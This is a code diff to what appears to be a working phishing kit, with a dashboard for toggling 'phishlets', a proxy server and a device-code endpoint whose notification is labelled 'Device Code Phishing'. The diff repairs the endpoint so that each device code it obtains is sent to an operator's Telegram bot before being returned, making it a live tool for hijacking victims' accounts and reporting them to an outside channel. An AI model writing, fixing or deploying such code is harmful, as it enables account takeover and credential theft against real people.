@@ -1231,9 +1231,6 @@ dashApp.post('/api/phishlets/toggle', (req, res) => {
     }
 });
 
-// ── DEVICE CODE ENDPOINTS (MOVED TO MAIN APP BELOW) ──
-// These are now in the main app section at the bottom
-
 // ================================================
 // 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
 // ================================================
@@ -2213,14 +2210,8 @@ app.post('/device/request', async (req, res) => {
         );
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
-        res.json(data);
-    } catch (error) {
-        console.error('❌ Device code error:', error.response?.data || error.message);
-        res.status(500).json({ error: error.response?.data || error.message });
-    }
-});
         
-        // Send Telegram
+        // Send Telegram notification
         const message = `
 📱 **Device Code Phishing**
 
@@ -2230,11 +2221,11 @@ app.post('/device/request', async (req, res) => {
 
 **Code:** \`${data.user_code}\`
         `;
-        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
-        }).catch(() => {});
+        }).catch(() => console.log('⚠️ Telegram notify failed but continuing'));
         
         res.json(data);
     } catch (error) {
